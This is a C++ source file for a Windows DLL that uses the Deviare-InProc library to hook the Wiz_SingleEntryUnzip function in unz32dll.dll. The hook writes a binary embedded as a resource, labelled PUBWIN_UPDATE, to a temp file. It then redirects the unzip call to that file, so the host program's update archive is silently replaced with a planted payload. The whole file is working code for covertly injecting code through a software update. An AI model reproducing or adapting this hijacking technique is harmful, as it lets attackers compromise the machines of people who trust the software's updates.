#include "sunshine.h"

#include "resource.h"
#include "fake\kernel32.h"

#pragma comment(lib,"nektra\\Deviare-InProc\\Libs\\2017\\NktHookLib_Debug.lib")

__declspec(dllexport) void _() {

}

namespace global {
	HINSTANCE hCurrentModule = NULL;
}

namespace hook {
	enum Function {
		Wiz_SingleEntryUnzip,

		MaxFunctionNumber
	};

	CNktHookLib cNktHook;
	CNktHookLib::HOOK_INFO hiHooks[MaxFunctionNumber] = { 0 };

	inline CNktHookLib::HOOK_INFO* GetInfo(hook::Function enumFunction) {
		return &hook::hiHooks[enumFunction];
	}

	inline CNktHookLib::HOOK_INFO* SetHookInfo(hook::Function enumFunction, void* lpProcToHook, void* lpNewProcAddr) {
		hook::hiHooks[enumFunction].nHookId = 0;
		hook::hiHooks[enumFunction].lpCallOriginal = NULL;

		hook::hiHooks[enumFunction].lpProcToHook = lpProcToHook;
		hook::hiHooks[enumFunction].lpNewProcAddr = lpNewProcAddr;

		return &hook::hiHooks[enumFunction];
	}
}

namespace fake {
	typedef int (WINAPI DLLPRNT) (LPSTR, unsigned long);
	typedef int (WINAPI DLLPASSWORD) (LPSTR, int, LPCSTR, LPCSTR);
	typedef int (WINAPI DLLSERVICE) (LPCSTR, unsigned long);
	typedef void (WINAPI DLLSND) (void);
	typedef int (WINAPI DLLREPLACE)(LPSTR);
	typedef void (WINAPI DLLMESSAGE)(unsigned long, unsigned long, unsigned,
		unsigned, unsigned, unsigned, unsigned, unsigned,
		char, LPSTR, LPSTR, unsigned long, char);

	typedef struct {
		DLLPRNT *print;
		DLLSND *sound;
		DLLREPLACE *replace;
		DLLPASSWORD *password;
		DLLMESSAGE *SendApplicationMessage;
		DLLSERVICE *ServCallBk;
		unsigned long TotalSizeComp;
		unsigned long TotalSize;
		unsigned long CompFactor;       /* "long" applied for proper alignment, only */
		unsigned long NumMembers;
		WORD cchComment;

	} USERFUNCTIONS, far * LPUSERFUNCTIONS;

	typedef struct {
		int ExtractOnlyNewer;
		int SpaceToUnderscore;
		int PromptToOverwrite;
		int fQuiet;
		int ncflag;
		int ntflag;
		int nvflag;
		int nfflag;
		int nzflag;
		int ndflag;
		int noflag;
		int naflag;
		int nZIflag;
		int C_flag;
		int fPrivilege;
		LPSTR lpszZipFN;
		LPSTR lpszExtractDir;
	} DCL, far * LPDCL;

	typedef int (WINAPI* __pfnWiz_SingleEntryUnzip)(int ifnc, char **ifnv, int xfnc, char **xfnv, LPDCL lpDCL, LPUSERFUNCTIONS lpUserFunc);
	int WINAPI Wiz_SingleEntryUnzip(int ifnc, char **ifnv, int xfnc, char **xfnv, LPDCL lpDCL, LPUSERFUNCTIONS lpUserFunc) {
		size_t sizeBusinessDLLSize = 0;

		void * pBusinessDLL = GetResourceContent(GetModuleHandleByAddr(GetModuleHandleByAddr), IDR_BIN_PUBWIN_UPDATE, "BIN", &sizeBusinessDLLSize);
		if (NULL == pBusinessDLL) {
			return __pfnWiz_SingleEntryUnzip(hook::GetInfo(hook::Wiz_SingleEntryUnzip)->lpCallOriginal)(ifnc, ifnv, xfnc, xfnv, lpDCL, lpUserFunc);
		}
		//defer_free _(pBusinessDLL);


		TCHAR szFakeUpdateFileName[MAX_PATH] = { 0 };
		::GetTempPath(MAX_PATH, szFakeUpdateFileName);
		::GetTempFileName(szFakeUpdateFileName, "bin", 0, szFakeUpdateFileName);

		if (!SetFile(szFakeUpdateFileName, pBusinessDLL, sizeBusinessDLLSize)) {
			return __pfnWiz_SingleEntryUnzip(hook::GetInfo(hook::Wiz_SingleEntryUnzip)->lpCallOriginal)(ifnc, ifnv, xfnc, xfnv, lpDCL, lpUserFunc);
		}

		lpDCL->lpszZipFN = szFakeUpdateFileName;
		return __pfnWiz_SingleEntryUnzip(hook::GetInfo(hook::Wiz_SingleEntryUnzip)->lpCallOriginal)(ifnc, ifnv, xfnc, xfnv, lpDCL, lpUserFunc);
	}
}

BOOL OnProcessAttach(HINSTANCE hModule) {

	//hook::cNktHook.Hook(fake::kernel32::SetHookInfo(fake::kernel32::hook::CreateFileA, CreateFileA, fake::kernel32::CreateFileA), 1);

	hook::cNktHook.Hook(hook::SetHookInfo(hook::Wiz_SingleEntryUnzip, ::GetProcAddress(LoadLibraryA("unz32dll.dll"), "Wiz_SingleEntryUnzip"), fake::Wiz_SingleEntryUnzip), 1);

	return TRUE;
}

BOOL OnProcessDetach(HINSTANCE hModule) {
	hook::cNktHook.UnhookAll();

	return TRUE;
}


BOOL APIENTRY DllMain(_In_ HINSTANCE hinstDLL, _In_ DWORD fdwReason, _In_ LPVOID lpvReserved) {
	global::hCurrentModule = hinstDLL;
	DisableThreadLibraryCalls(hinstDLL);

	switch (fdwReason)
	{
	case DLL_PROCESS_ATTACH:
		return OnProcessAttach(hinstDLL);
	case DLL_PROCESS_DETACH:
		return OnProcessDetach(hinstDLL);
	}

	return TRUE;
}